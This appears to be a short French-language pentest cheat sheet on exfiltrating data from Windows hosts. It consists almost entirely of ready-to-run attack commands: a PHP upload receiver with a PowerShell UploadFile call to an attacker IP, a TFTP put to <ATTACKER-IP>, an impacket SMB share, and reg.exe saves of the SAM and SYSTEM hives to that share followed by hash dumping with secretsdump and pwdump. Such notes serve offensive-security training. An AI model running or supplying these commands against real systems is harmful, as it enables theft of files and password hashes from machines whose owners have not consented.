# Data Exfiltration on Windows

## PowerShell 

De la machine cible vers la machine attaquante en utilisant le fichier `upload.php`

Mise en place d'un serveur web

```sh
sudo mkdir /var/www/uploads
sudo chown www-data:www-data uploads
sudo php -S localhost:80
```

Contenu du fichier upload.php

```php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);
?>
```

```sh
(New-Object System.Net.WebClient).UploadFile('http://192.168.45.128/upload.php', 'C:\Users\Dipeua\remote_file.ext')
```

## TFTP

```sh
sudo ftpd --daemon --port 69 /var/www/uploads
```

```sh
tftp -i <ATTACKER-IP> put remote_file.ext
```

## SMB

Récupérer les fichiers contenant les hachages de mot de passe, les renvoyer à notre machine attaquante, puis vider les hachages localement:

```sh
impacket-smbserver share path -smb2support -comment 'Hacker Dipeua, Get your data'
```

```sh
reg.exe save HKLM\SAM sam.bak
reg.exe save HKLM\SYSTEM system.bak

#ou

reg.exe save HKLM\SAM \\<ATTACKER-IP>\share\sam.bak
reg.exe save HKLM\SYSTEM \\<ATTACKER-IP>\share\system.bak
```

Dump hashs

```sh
secretsdump.py -sam sam.bak -system system.bak LOCAL
/usr/share/creddump7/pwdump.py SYSTEM SAM
```